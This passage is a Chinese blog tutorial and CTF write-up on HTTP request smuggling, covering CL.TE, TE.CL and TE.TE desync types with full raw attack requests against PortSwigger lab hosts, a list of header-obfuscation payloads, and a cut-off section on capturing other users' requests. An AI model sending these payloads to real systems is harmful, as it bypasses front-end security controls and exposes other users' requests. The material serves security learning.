    <link href="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/"/>
    <url>/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP-request-smuggling与CTF实战利用"><a href="#HTTP-request-smuggling与CTF实战利用" class="headerlink" title="HTTP request smuggling与CTF实战利用"></a>HTTP request smuggling与CTF实战利用</h1><p><em><strong>@springtime</strong></em></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>​最近刷题的时候多次遇到HTTP请求走私相关的题目，但之前都没怎么接触到相关的知识点，只是在<strong>GKCTF2021–hackme</strong>中使用到了 **CVE-2019-20372(Nginx&lt;1.17.7 请求走私漏洞)**，具体讲就是通过nginx的走私漏洞访问到Weblogic Console的登录页面，然后打Weblogic历史漏洞读取flag。当时做那道题的时候对走私漏洞没有深入理解，今天打ISCC2022的时候又遇到了一道利用gunicorn&lt;20.04请求走私漏洞绕waf的题目，因此好好学习一下还是很有必要的。</p><h2 id="0x01-发展时间线"><a href="#0x01-发展时间线" class="headerlink" title="0x01 发展时间线"></a>0x01 发展时间线</h2><blockquote><p>​最早在2005年，由Chaim Linhart，Amit Klein，Ronen Heled和Steve Orrin共同完成了一篇关于HTTP Request Smuggling这一攻击方式的报告。通过对整个RFC文档的分析以及丰富的实例，证明了这一攻击方式的危害性。</p><p><a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf</a></p><p>​在2016年的**<code>DEFCON 24</code>** 上，@regilero在他的议题——Hiding Wookiees in HTTP中对前面报告中的攻击方式进行了丰富和扩充。</p><p>[<a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf]">https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf]</a>(<a href="https://media.defcon.org/DEF">https://media.defcon.org/DEF</a> CON 24&#x2F;DEF CON 24 presentations&#x2F;DEF CON 24 - Regilero-Hiding-Wookiees-In-Http.pdf)</p><p>​在2019年的**<code>BlackHat USA 2019</code>**上，PortSwigger的James Kettle在他的议题——HTTP Desync Attacks: Smashing into the Cell Next Door中针对当前的网络环境，展示了使用分块编码来进行攻击的攻击方式，扩展了攻击面，并且提出了完整的一套检测利用流程。</p></blockquote><h2 id="0x02-什么是请求走私"><a href="#0x02-什么是请求走私" class="headerlink" title="0x02 什么是请求走私"></a>0x02 什么是请求走私</h2><p>​当今的web架构中，单纯的一对一客户端—服务端结构已经逐渐过时。为了更安全的处理客户端发来的请求，服务端会被分为两部分：<strong>前端服务器与后端服务器</strong>。前端服务器(例如代理服务器)负责安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，并对每一个请求都进行响应。但是在这个过程中要保证前端服务器与后端服务器的请求边界设定一致，<strong>如果前后端服务器对请求包处理出现差异，那么就可能导致攻击者通过发送一个精心构造的http请求包，绕过前端服务器的安全策略直接抵达后端服务器访问到原本禁止访问的服务或接口，这就是http请求走私。</strong></p><p>​听起来是不是有点像SSRF？不过SSRF与HTTP请求走私是有差别的，SSRF是直接利用内网机器来访问内网资源，但请求走私不是。用一张portswigger报告中经典的图来理解一下，有一种夹带私货的感觉，或许这就是被称为走私漏洞的原因吧：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220502224219892.png" class="" title="image-20220502224219892"><h2 id="0x03-漏洞成因与常见类型"><a href="#0x03-漏洞成因与常见类型" class="headerlink" title="0x03 漏洞成因与常见类型"></a>0x03 漏洞成因与常见类型</h2><p>​http请求走私攻击比较特殊，它不像常规的web漏洞那样直观。它更多的是在复杂网络环境下，不同的服务器对RFC标准实现的方式不同，程度不同。因此，对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，这样就产生了安全风险。</p><p>​在学习之前我们先了解一下HTTP1.1中使用最为广泛的两种特性：<strong>Keep-Alive&amp;Pipeline</strong>。</p><h3 id="Keep-Alive-amp-Pipeline"><a href="#Keep-Alive-amp-Pipeline" class="headerlink" title="Keep-Alive&amp;Pipeline"></a>Keep-Alive&amp;Pipeline</h3><p>​所谓<code>Keep-Alive</code>，就是在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在<code>HTTP1.1</code>中是默认开启的。</p><p>​有了<code>Keep-Alive</code>之后，后续就有了<code>Pipeline</code>，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p><p>​如今，浏览器默认是不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。</p><h3 id="CL-amp-TE"><a href="#CL-amp-TE" class="headerlink" title="CL&amp;TE"></a>CL&amp;TE</h3><p>​CL 和 TE 即是 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 请求头（严格来讲前者是个实体头，为了方便就都用请求头代指）。这里比较有趣的是 <code>Transfer-Encoding</code>（HTTP&#x2F;2 中不再支持），指定用于传输请求主体的编码方式，可以用的值有 chunked&#x2F;compress&#x2F;deflate&#x2F;gzip&#x2F;identity ，完整的定义在 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding#Directives">Transfer-Encoding#Directives</a> 和 <a href="https://tools.ietf.org/html/rfc2616#section-3.6">rfc2616#section-3.6</a></p><p>​CL好理解，对于TE我们重点关注chunked。当我们设置TE为chunked时，CL就会被省略。为了区分chunk的边界，我们需要在每个chunk前面用16进制数来表示当前chunk的长度，后面加上\r\n，再后面就是chunk的内容，然后再用\r\n来代表chunk的结束。最后用长度为 0 的块表示终止块。终止块后是一个 trailer，由 0 或多个实体头组成，可以用来存放对数据的数字签名等。譬如下面这个例子：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-stylus"><span class="hljs-selector-tag">b</span>  <span class="hljs-comment">//chunk_size</span></span><br><span class="language-stylus">q=smuggling</span><br><span class="language-stylus"><span class="hljs-number">6</span></span><br><span class="language-stylus">hahaha</span><br><span class="language-stylus"><span class="hljs-number">0</span>  <span class="hljs-comment">//end</span></span><br><span class="language-stylus"><span class="hljs-selector-attr">[blank]</span></span><br><span class="language-stylus"><span class="hljs-selector-attr">[blank]</span></span><br></code></pre></td></tr></table></figure><p><strong>另外要注意\r\n占2字节</strong>，我们在计算长度的时候很容易把它们忽略。最后把请求包以字节流形式表述出来就是：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">POST / HTTP/<span class="hljs-number">1.1</span>\r\nHost: <span class="hljs-number">1.</span>com\r\nContent-<span class="hljs-name">Type</span>: application/x-www-form-urlencoded\r\nTransfer-<span class="hljs-name">Encoding</span>: chunked\r\n\r\nb\r\nq=smuggling\r\n6\r\nhahaha\r\n0\r\n\r\n<br></code></pre></td></tr></table></figure><h3 id="常见走私类型"><a href="#常见走私类型" class="headerlink" title="常见走私类型"></a>常见走私类型</h3><h4 id="1-CL不为0"><a href="#1-CL不为0" class="headerlink" title="1.CL不为0"></a>1.CL不为0</h4><p>如果前端代理服务器允许GET携带请求体，而后端服务器不允许GET携带请求体，后端服务器就会直接忽略掉GET请求中的<code>Content-Length</code>头，这就有可能导致请求走私。</p><p>例如我们构造出：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">GET / HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><br>Host: example.com<span class="hljs-string">\r\n</span><br>Content-Length: <span class="hljs-number">43</span><span class="hljs-string">\r\n</span><br><br>GET / admin HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><br>Host: example.com<span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br></code></pre></td></tr></table></figure><p>在前端服务器看来它是一个请求，但是在后端服务器来看它就是：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>第一个请求<br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span>\r\n<br>Host: example.com\r\n<br><br><span class="hljs-regexp">//</span>第二个请求<br>GET <span class="hljs-regexp">/ admin HTTP/</span><span class="hljs-number">1.1</span>\r\n<br>Host: example.com\r\n<br></code></pre></td></tr></table></figure><h4 id="2-CL-CL"><a href="#2-CL-CL" class="headerlink" title="2.CL  CL"></a>2.CL  CL</h4><p>在<code>RFC7230</code>的第<code>3.3.3</code>节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p><p><a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">https://tools.ietf.org/html/rfc7230#section-3.3.3</a></p><p>但是很明显这并非是强制的，如果服务器不遵守安全规定在服务器收到多个CL不相同的请求时不返回400错误，那么就可能会导致请求走私。</p><p>我们假设前端服务器按照第一个CL处理而后端服务器按照第二个CL，构造出如下HTTP包：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">POST / HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><br>Host: example.com<span class="hljs-string">\r\n</span><br>Content-Length: <span class="hljs-number">8</span><span class="hljs-string">\r\n</span><br>Content-Length: <span class="hljs-number">7</span><span class="hljs-string">\r\n</span><br><br><span class="hljs-number">12345</span><span class="hljs-string">\r\n</span><br>a<br></code></pre></td></tr></table></figure><p>前端代理服务器收到的请求通过第一个CL判断body为8字节，随后将包发送给后端源服务器；源服务器收到请求通过第二个CL判断body为7字节，这时候最后一个字节 <code>b&#39;a&#39;</code>就会被遗留在源服务器缓存器。由于前后端服务器一般是宠用TCP连接，假设此时正常用户向服务器发送了正常的数据包，如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n<br><span class="hljs-attribute">Host</span>: example.com\r\n<br></code></pre></td></tr></table></figure><p>这时残留在缓存中的一个字节就会被添加到这个正常的请求前端变成：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aGET</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n<br><span class="hljs-attribute">Host</span>: example.com\r\n<br></code></pre></td></tr></table></figure><p>导致了请求走私，正常数据包被篡改。</p><p>但很明显这种情况过于“巧合”应该很难遇见，存在两个CL的包一般服务器都不会接受，在<code>RFC2616</code>的第4.4节中，规定:<code>如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length</code>，这就意味着我们可以在头部同时包含这两种请求头，相比这下这种方式更现实一些。</p><h4 id="3-CL-TE"><a href="#3-CL-TE" class="headerlink" title="3.CL TE"></a>3.CL TE</h4><p>所谓CL TE就是前置服务器认为 <code>Content-Length</code> 优先级更高（或者说根本就不支持 <code>Transfer-Encoding</code> ） ，后端服务器认为 <code>Transfer-Encoding</code> 优先级更高。</p><p>我们可以构造出body中带有字节 <code>0</code>的请求包，前端服务器通过CL判断这是一个正常的数据包并转发给后端，后端服务器使用TE就会把字节<code>0</code>后的数据滞留到缓冲区，并且与下一次的正常请求进行拼接，这里用一下portswigger团队的lab作为实验：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>构造如下请求包:</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs livescript">POST / HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><br>Host: ac721f8e1fcb0119c0b98800005c0061.web-security-academy.net<span class="hljs-string">\r\n</span><br>Cookie: session=ehzpRrrgyPHDRJtSnaWLcZ0fstSXLWiC<span class="hljs-string">\r\n</span><br>Sec-Ch-Ua: <span class="hljs-string">&quot; Not A;Brand&quot;</span>;v=<span class="hljs-string">&quot;99&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;100&quot;</span>, <span class="hljs-string">&quot;Google Chrome&quot;</span>;v=<span class="hljs-string">&quot;100&quot;</span><span class="hljs-string">\r\n</span><br>Sec-Ch-Ua-Mobile: ?<span class="hljs-number">0</span><span class="hljs-string">\r\n</span><br>Sec-Ch-Ua-Platform: <span class="hljs-string">&quot;Windows&quot;</span><span class="hljs-string">\r\n</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-string">\r\n</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">100.0</span>.<span class="hljs-number">4896.127</span> Safari/<span class="hljs-number">537.36</span><span class="hljs-string">\r\n</span><br>Accept: text<span class="hljs-regexp">/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/</span>*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0.9</span><span class="hljs-string">\r\n</span><br>Sec-Fetch-Site: none<span class="hljs-string">\r\n</span><br>Sec-Fetch-Mode: navigate<span class="hljs-string">\r\n</span><br>Sec-Fetch-User: ?<span class="hljs-number">1</span><span class="hljs-string">\r\n</span><br>Sec-Fetch-Dest: document<span class="hljs-string">\r\n</span><br>Accept-Encoding: gzip, deflate<span class="hljs-string">\r\n</span><br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><span class="hljs-string">\r\n</span><br>Connection: close<span class="hljs-string">\r\n</span><br>Content-Length: <span class="hljs-number">10</span><span class="hljs-string">\r\n</span><br>Transfer-Encoding:chunked<span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br><span class="hljs-number">0</span><span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br>A<span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br></code></pre></td></tr></table></figure><p>连续发送几次就会发现字母A被拼接到了下一请求中，导致了请求走私，当然也会报错。</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220503231744853.png" class="" title="image-20220503231744853"><h4 id="4-TE-CL"><a href="#4-TE-CL" class="headerlink" title="4.TE CL"></a>4.TE CL</h4><p>TE CL与CL TE正好相反，假如前端服务器处理TE请求头，而后端服务器处理CL请求头，我们同样可以构造恶意数据包完成走私攻击；依旧使用portswigger的lab：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><p>我们构造出如下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ac901ff41f9aa7fdc0ce7b16001000db.web-security-academy.net<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=MrJkkUD4dyxv9gzzgERPtb56d0cCo79Z<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Sec-Ch-Ua</span><span class="hljs-punctuation">: </span>&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;100&quot;, &quot;Google Chrome&quot;;v=&quot;100&quot;<br><span class="hljs-attribute">Sec-Ch-Ua-Mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">Sec-Ch-Ua-Platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>cross-site<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://portswigger.net/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>4<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-apache"><span class="hljs-attribute">12</span></span><br><span class="language-apache"><span class="hljs-attribute">WPOST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">0</span></span><br><span class="language-apache"></span><br></code></pre></td></tr></table></figure><p>多次发送后发现：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220503233723881.png" class="" title="image-20220503233723881"><p>WPOST被拆分了出来，重点关注body部分</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\r\n</span><br><span class="hljs-number">12</span><span class="hljs-string">\r\n</span><br>WPOST / HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br><span class="hljs-number">0</span><span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br></code></pre></td></tr></table></figure><p>前端处理TE读取到<code>0\r\n\r\n</code>之后就认为读取完毕发送给后端，而后端处理CL只读取4字节<code>\r\n12</code>就认为数据包结束，这时候剩下的<code>WPOST / HTTP/1.1\r\n\r\n0\r\n\r\n</code>就被认为是另一个请求，因此发生了请求报错。</p><h4 id="5-TE-TE"><a href="#5-TE-TE" class="headerlink" title="5.TE TE"></a>5.TE TE</h4><p>TE-TE：前置和后端服务器都支持 <code>Transfer-Encoding</code>，但通过混淆能让它们在处理时产生分歧。</p><p>lab:<a href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header</a></p><p>构造出如下请求包：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: ace41f161f1a1382c0814ee300db0086.web-security-academy.net<br><span class="hljs-attribute">Cookie</span>: session=nqskpdP0aWuG4GW5xlYYxEUVulcJC6vG<br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Sec</span>-Ch-Ua: <span class="hljs-string">&quot; Not A;Brand&quot;</span>;v=<span class="hljs-string">&quot;99&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;100&quot;</span>, <span class="hljs-string">&quot;Google Chrome&quot;</span>;v=<span class="hljs-string">&quot;100&quot;</span><br><span class="hljs-attribute">Sec</span>-Ch-Ua-Mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">Sec</span>-Ch-Ua-Platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">100</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4896</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: cross-site<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Referer</span>: https://portswigger.net/<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">4</span><br><span class="hljs-attribute">Transfer</span>-Encoding:chunked  //两种TE造成混淆<br><span class="hljs-attribute">Transfer</span>-Encoding:cow<br><br><span class="hljs-attribute">5c</span><br><span class="hljs-attribute">WPOST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">15</span><br><br><span class="hljs-attribute">x</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">0</span><br><br><br></code></pre></td></tr></table></figure><p>多次发送后：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220504000904015.png" class="" title="image-20220504000904015"><p>可以看到这里我们采用了：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-built_in">Transfer</span>-Encoding:chunked\r\n<br><span class="hljs-built_in">Transfer</span>-Encoding:cow\r\n<br></code></pre></td></tr></table></figure><p>除了这种混淆方式，除了这些portswigger团队还给出了其它可用于TE混淆的payload：</p><blockquote><dl><dt>Transfer-Encoding: xchunked<br>Transfer-Encoding[空格]: chunked<br>Transfer-Encoding: chunked<br>Transfer-Encoding: x<br>Transfer-Encoding:[tab]chunked<br>[空格]Transfer-Encoding: chunked<br>X: X[\n]Transfer-Encoding: chunked<br>Transfer-Encoding</dt><dd>chunked</dd></dl></blockquote><h2 id="0x04-走私攻击应用实例"><a href="#0x04-走私攻击应用实例" class="headerlink" title="0x04 走私攻击应用实例"></a>0x04 走私攻击应用实例</h2><h3 id="1-使用CL-TE走私获取其他用户的请求"><a href="#1-使用CL-TE走私获取其他用户的请求" class="headerlink" title="1.使用CL TE走私获取其他用户的请求"></a>1.使用CL TE走私获取其他用户的请求</h3><p>lab：<a href="https://ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net/">https://ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net/</a></p><p>打开页面是blog，用户可以在页面发表评论，由于前后端服务器的请求头处理差异导致我们可以利用CL TE获取其它用户的请求头，譬如我们构造出如下请求：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net<br><span class="hljs-attribute">Cookie</span>: session=plmft6w5VTTDEI0J15a06sNdaQUcPNPO<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">333</span><br><span class="hljs-attribute">Transfer</span>-Encoding:chunked<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><br><span class="hljs-attribute">0</span><br><br><span class="hljs-attribute">POST</span> /post/comment HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net<br><span class="hljs-attribute">Cookie</span>: session=plmft6w5VTTDEI0J15a06sNdaQUcPNPO<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">700</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><br><span class="hljs-attribute">csrf</span>=vMqN9Cq1aip2DYMTyFEokIA5IkONc7oM&amp;postId=<span class="hljs-number">6</span>&amp;name=a&amp;email=<span class="hljs-number">1</span>%<span class="hljs-number">40</span>qq.com&amp;website=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span 